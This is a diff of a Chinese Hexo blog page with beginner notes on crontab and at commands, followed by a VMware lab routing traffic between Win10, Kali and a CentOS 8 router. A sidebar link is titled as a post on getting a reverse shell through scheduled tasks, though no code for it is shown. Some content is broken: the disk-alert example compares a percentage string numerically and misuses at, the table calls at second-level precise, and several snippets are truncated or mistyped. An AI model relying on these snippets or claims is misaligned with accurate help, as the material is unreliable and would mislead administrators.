+<h4 id="1-crontab-e-：编辑任务"><a href="#1-crontab-e-：编辑任务" class="headerlink" title="1.crontab -e ：编辑任务"></a>1.crontab -e ：编辑任务</h4><ul>
+<li><p>功能：</p>
+<p>打开当前用户的 ~&#x2F;.crontab 文件，支持 vi 或 nano 编辑器（取决于系统默认）。</p>
+</li>
+<li><p>使用场景：</p>
+<p>添加、修改或删除个人定时任务。</p>
+</li>
+<li><p>示例：</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 添加每日备份任务</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+
+<p>corn</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 3 * * * touch /tmp/test2.t</span><br></pre></td></tr></table></figure>
+
+<p>保存退出后，任务自动生效。</p>
+<h4 id="2-crontab-l-：列出任务"><a href="#2-crontab-l-：列出任务" class="headerlink" title="2.crontab -l ：列出任务"></a>2.crontab -l ：列出任务</h4><ul>
+<li><p>功能：</p>
+<p>显示当前用户的所有计划任务（格式化输出）。</p>
+</li>
+<li><p>示例：</p>
+<p>bash</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@xnha ~]# crontab -l</span><br><span class="line">0 3 * * * touch /tmp/test2.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-crontab-r-：删除任务"><a href="#3-crontab-r-：删除任务" class="headerlink" title="3.crontab -r ：删除任务"></a>3.crontab -r ：删除任务</h4><ul>
+<li><p>功能：</p>
+<p>永久删除当前用户的所有计划任务。</p>
+</li>
+<li><p>示例：</p>
+<p>bash</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-crontab-u-username-：管理其他用户"><a href="#4-crontab-u-username-：管理其他用户" class="headerlink" title="4.crontab -u username ：管理其他用户"></a>4.crontab -u username ：管理其他用户</h4><ul>
+<li><p>功能：</p>
+<p>需要 sudo 权限，用于查看&#x2F;编辑其他用户的任务。</p>
+</li>
+<li><p>示例：</p>
+<p>bash</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@xnha ~]# crontab -u user777 -e</span><br><span class="line">no crontab for user777 - using an empty one</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">[root@xnha ~]# crontab -u user777 -l</span><br><span class="line">0 3 * * * touch /tmp/user77</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-使用方法"><a href="#3-4-使用方法" class="headerlink" title="3.4 使用方法"></a>3.4 使用方法</h3><p>场景1：每两个月的工作日的凌晨3点打包备份日志&#x2F;var&#x2F;log&#x2F;secure<br>可以在&#x2F;etc&#x2F;crontab中直接编辑，也可以使用命令crontab -e 进行编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、-at-vs-cron-对比分析"><a href="#四、-at-vs-cron-对比分析" class="headerlink" title="四、 at vs cron 对比分析"></a>四、 at vs cron 对比分析</h2><table>
+<thead>
+<tr>
+<th align="center">特性</th>
+<th align="center">at</th>
+<th align="center">cron</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">适用场景</td>
+<td align="center">一次性&#x2F;延迟任务</td>
+<td align="center">周期性重复任务</td>
+</tr>
+<tr>
+<td align="center">时间精度</td>
+<td align="center">秒级</td>
+<td align="center">分钟级</td>
+</tr>
+<tr>
+<td align="center">资源开销</td>
+<td align="center">无长期守护进程</td>
+<td align="center">需 crond 服务常驻</td>
+</tr>
+<tr>
+<td align="center">配置复杂度</td>
+<td align="center">简单时间描述</td>
+<td align="center">复杂时间表达式</td>
+</tr>
+</tbody></table>
+<h2 id="五、-总结与实战案例"><a href="#五、-总结与实战案例" class="headerlink" title="五、 总结与实战案例"></a>五、 总结与实战案例</h2><h3 id="5-1-关键总结"><a href="#5-1-关键总结" class="headerlink" title="5.1 关键总结"></a>5.1 关键总结</h3><ul>
+<li>at ：适合一次性任务（如临时重启服务、延迟执行敏感操作）。</li>
+<li>cron ：适合长期周期任务（如每日备份、定时监控）</li>
+</ul>
+<h3 id="5-2-综合案例：自动化运维"><a href="#5-2-综合案例：自动化运维" class="headerlink" title="5.2 综合案例：自动化运维"></a>5.2 综合案例：自动化运维</h3><p>需求：<br>每日凌晨2点备份网站数据到远程服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 2 * * * root ./linux.sh</span><br></pre></td></tr></table></figure>
+
+<p>每小时检查服务器磁盘使用率，超过90%时发邮件报警：</p>
+<p>解决方案：github搜索脚本，按时运行！</p>
+<ol>
+<li>使用 cron 备份：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 2 * * * rsync -avz /www/user123.com/ user@remote:/backu</span><br></pre></td></tr></table></figure>
+
+<p>   2.使用at发送报警：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 每小时检查磁盘</span><br><span class="line">0 * * * * df -h | grep /dev/sda1 | awk &#x27;&#123;print $5&#125;&#x27; | while read -r usage;</span><br><span class="line">do</span><br><span class="line"> if [ &quot;$usage&quot; -gt 90 ]; then</span><br><span class="line">   at now + 5 minutes -t Asia/Shanghai</span><br><span class="line">   mail -s &quot;Disk Alert!&quot; admin@example.com &lt;&lt;&lt; &quot;Disk usage on /dev/sda1 is</span><br><span class="line">$usage%&quot;</span><br><span class="line"> fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/08/09/%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A6%82%E8%BF%B0/" data-id="cme3urluc0004900f7hhh41p1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-按照拓扑完成网络管理配置任务" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/08/09/%E6%8C%89%E7%85%A7%E6%8B%93%E6%89%91%E5%AE%8C%E6%88%90%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1/" class="article-date">
+  <time class="dt-published" datetime="2025-08-09T03:55:11.790Z" itemprop="datePublished">2025-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807150056478.png" alt="image-20250807150056478"></p>
+<h1 id="按照本拓扑完成网络管理配置"><a href="#按照本拓扑完成网络管理配置" class="headerlink" title="按照本拓扑完成网络管理配置"></a>按照本拓扑完成网络管理配置</h1><h2 id="一、在虚拟机编辑中打开虚拟网络编辑器，建立VMnet2和VMnet3"><a href="#一、在虚拟机编辑中打开虚拟网络编辑器，建立VMnet2和VMnet3" class="headerlink" title="一、在虚拟机编辑中打开虚拟网络编辑器，建立VMnet2和VMnet3"></a>一、在虚拟机编辑中打开虚拟网络编辑器，建立VMnet2和VMnet3</h2><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807150613360.png" alt="image-20250807150613360"></p>
+<p>（ps.主要不要勾选“使用DHCP”）</p>
+<h2 id="二、给win10配置IP"><a href="#二、给win10配置IP" class="headerlink" title="二、给win10配置IP"></a>二、给win10配置IP</h2><h3 id="1-将win10的网络适配器配置为VMware2"><a href="#1-将win10的网络适配器配置为VMware2" class="headerlink" title="1.将win10的网络适配器配置为VMware2"></a>1.将win10的网络适配器配置为VMware2</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807150904701.png" alt="image-20250807150904701"></p>
+<h3 id="2-在win10的网络连接中将其IP修改为192-168-2-1"><a href="#2-在win10的网络连接中将其IP修改为192-168-2-1" class="headerlink" title="2.在win10的网络连接中将其IP修改为192.168.2.1"></a>2.在win10的网络连接中将其IP修改为192.168.2.1</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807151023407.png" alt="image-20250807151023407"></p>
+<h2 id="三、给kali配置IP"><a href="#三、给kali配置IP" class="headerlink" title="三、给kali配置IP"></a>三、给kali配置IP</h2><h3 id="1-将为kali的网络适配器配置为VMware3"><a href="#1-将为kali的网络适配器配置为VMware3" class="headerlink" title="1.将为kali的网络适配器配置为VMware3"></a>1.将为kali的网络适配器配置为VMware3</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807151343626.png" alt="image-20250807151343626"></p>
+<h3 id="2-备份kali原本配置文件（我打错了成back，问题不大）并新建interfaces"><a href="#2-备份kali原本配置文件（我打错了成back，问题不大）并新建interfaces" class="headerlink" title="2.备份kali原本配置文件（我打错了成back，问题不大）并新建interfaces"></a>2.备份kali原本配置文件（我打错了成back，问题不大）并新建interfaces</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807151645466.png" alt="image-20250807151645466"></p>
+<h3 id="3-写入IP配置"><a href="#3-写入IP配置" class="headerlink" title="3.写入IP配置"></a>3.写入IP配置</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807152009052.png" alt="image-20250807152009052"></p>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153904139.png" alt="image-20250807153904139"></p>
+<p>ip addr flush dev eth0 —— 先把网卡上原来的 IP 清干净。<br>ip addr add 172.16.2.1&#x2F;24 dev eth0 —— 给网卡绑一个新 IP（172.16.2.1，子网掩码 24 位）。<br>ip route add default via 172.16.2.254 —— 告诉系统：要上网先找 172.16.2.254 这个网关。</p>
+<h3 id="4-重启服务后检查配置"><a href="#4-重启服务后检查配置" class="headerlink" title="4.重启服务后检查配置"></a>4.重启服务后检查配置</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807152314777.png" alt="image-20250807152314777"></p>
+<h2 id="四、给CentOS-8-进行双网卡配置"><a href="#四、给CentOS-8-进行双网卡配置" class="headerlink" title="四、给CentOS 8 进行双网卡配置"></a>四、给CentOS 8 进行双网卡配置</h2><h3 id="1-检查CentOS-8-我的是有ens160和ens224"><a href="#1-检查CentOS-8-我的是有ens160和ens224" class="headerlink" title="1.检查CentOS 8 我的是有ens160和ens224"></a>1.检查CentOS 8 我的是有ens160和ens224</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807152652655.png" alt="image-20250807152652655"></p>
+<h3 id="2-将CentOS-8-配置为两个网络适配器分别为：VMware2和3"><a href="#2-将CentOS-8-配置为两个网络适配器分别为：VMware2和3" class="headerlink" title="2.将CentOS 8 配置为两个网络适配器分别为：VMware2和3"></a>2.将CentOS 8 配置为两个网络适配器分别为：VMware2和3</h3><h3 id="3-重新编写网卡配置文件"><a href="#3-重新编写网卡配置文件" class="headerlink" title="3.重新编写网卡配置文件"></a>3.重新编写网卡配置文件</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153128993.png" alt="image-20250807153128993"></p>
+<h3 id="4-测试连通性发现"><a href="#4-测试连通性发现" class="headerlink" title="4.测试连通性发现"></a>4.测试连通性发现</h3><ul>
+<li>kali和ens224能够互相ping通</li>
+<li>win10和ens160能够互相ping通</li>
+<li>kali 和 win10 无法 互相ping通</li>
+</ul>
+<h3 id="5-配置路由转发"><a href="#5-配置路由转发" class="headerlink" title="5.配置路由转发"></a>5.配置路由转发</h3><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153509187.png" alt="image-20250807153509187"></p>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153540019.png" alt="image-20250807153540019"></p>
+<h2 id="五、最后测试连通性"><a href="#五、最后测试连通性" class="headerlink" title="五、最后测试连通性"></a>五、最后测试连通性</h2><p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153641131.png" alt="image-20250807153641131"></p>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250807153712196.png" alt="image-20250807153712196"></p>
+<p>而后可以实现了从kali到win10的整体联通，</p>
+<p><strong>完成了实验拓扑的要求</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/08/09/%E6%8C%89%E7%85%A7%E6%8B%93%E6%89%91%E5%AE%8C%E6%88%90%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E4%BB%BB%E5%8A%A1/" data-id="cme3urlud0005900fhnws4qop" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -196,6 +785,18 @@
         
           <li>
             <a href="/2025/08/09/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/09/%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A6%82%E8%BF%B0/">(no title)</a>
           </li>
         
       </ul>
